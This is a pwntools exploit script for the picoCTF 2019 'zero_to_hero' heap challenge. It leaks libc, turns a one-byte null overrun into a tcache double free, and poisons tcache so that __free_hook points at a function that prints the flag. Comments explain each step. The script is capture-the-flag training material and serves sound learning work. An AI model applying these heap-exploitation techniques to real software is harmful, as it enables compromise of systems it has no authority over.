#!/usr/bin/python
from pwn import *
import os

conn = remote('2019shell1.picoctf.com', 49928)
# conn = process('./zero_to_hero')
conn.sendline("y")
conn.recvuntil("It's dangerous to go alone. Take this: 0x")
one_gadgets=[0xe237f, 0xe2383, 0xe2386, 0x106ef8]
malloc_hook=0x1e4c30
free_hook=0x1e75a8

system = int(conn.recvline()[:-1], 16)
libc_base=system-0x52fd0
print("libc_base: %s system: %s" %(hex(libc_base), hex(system)))
conn.recvuntil("> ")

def alloc(size, content):
  conn.sendline("1")
  conn.recvuntil("What is the length of your description?")
  conn.recvuntil("> ")
  conn.sendline(str(size))

  conn.recvuntil("Enter your description: ")
  conn.recvuntil("> ")
  conn.send(content)

  conn.recvuntil("Done!")
  conn.recvuntil("> ")

def free(index):
  conn.sendline("2")
  conn.recvuntil("Which power would you like to remove?")
  conn.recvuntil("> ")
  conn.sendline(str(index))
  conn.recvuntil("> ")

# 1. there is a 1-byte (with value 0) heap overrun in function
#    0x400a4d.
# 2. when size is multiple of sizeof(size_t) == 8 bytes,
#    said overrun will collide with the chunk header of the
#    next chunk.
# 3. when chunk size of the next chunk is >= 0x110, the overrun
#    changes the chunk size in a way that will pass tcache checks
alloc(0x168, 'A' * 0x168)
alloc(0x168, 'B' * 0x168)

# push chunk 1 into tcache
free(1)

# push chunk 0 into tcache
free(0)

# pop chunk 0 out of tcache and overwrite size of chunk 1 with a null byte
# 0x171 ==> 0x100
alloc(0x168, 'C' * 0x168)

# now we can free chunk 1 again. tcache runs double free checks against
# a different tcache bin
free(1)

# now chunk 1 is in two tcache bins, a perfect double free scenario

# pop chunk 1 out of tcache bin 0x16 (0x170/0x10 - 1)
# make __free_hook the next item after chunk 1
alloc(0x168, p64(libc_base + free_hook))

# now tcache bin 0xf (0x100/0x10 - 1) contains two entries

# pop chunk 1 out of tcache bin 0xf
alloc(0xf0, p64(0x400A02))

# pop free_hook out of tcache bin 0xf and set it to function
# 0x400a02, which will print out the flag!
alloc(0xf0, p64(0x400A02))

# freeing any chunk will trigger free_hook and display the flag
conn.sendline("2")
conn.sendline("2")

# exit
conn.sendline("3")
conn.interactive()

